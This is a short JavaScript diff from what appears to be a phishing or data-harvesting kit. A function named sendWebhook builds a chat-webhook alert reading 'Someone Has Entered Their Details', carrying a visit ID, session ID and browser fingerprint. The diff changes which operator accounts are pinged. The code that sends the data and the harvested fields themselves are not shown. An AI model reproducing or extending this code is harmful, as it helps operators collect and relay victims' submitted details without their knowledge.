@@ -264,7 +264,7 @@ async function sendWebhook(userData) {
         console.log('🔧 Building completion webhook payload...');
         const embed = {
             title: '✅ **Made By @phonzr_adm 🤖**',
-            description: '@everyone 👤 Someone Has Entered Their Details',
+            description: '<@1254544301921144895> <@1188111923489820694> 👤 Someone Has Entered Their Details',
             color: 0x00ff00, // Green color for completion
             fields: [
                 { name: '🏷️ **USER IDENTIFICATION**', value: `**Visit ID:** \`${userVisitId}\`\n**Session ID:** \`${sessionId}\`\n**Fingerprint:** \`${userFingerprint}\``, inline: false },
